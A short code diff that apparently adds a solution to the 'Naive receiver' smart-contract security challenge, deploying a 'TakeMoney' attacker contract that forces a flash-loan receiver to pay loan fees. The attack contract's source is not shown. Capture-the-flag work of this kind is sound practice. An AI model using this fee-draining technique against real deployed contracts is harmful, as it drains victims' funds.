@@ -38,6 +38,9 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Easy: anyone can force the receiver to take loans at 1 ETH cost 
+        let TakeMoneyFactory = await ethers.getContractFactory('TakeMoney', player);
+        let takeMoney = await TakeMoneyFactory.deploy(pool.address, receiver.address);
     });
 
     after(async function () {
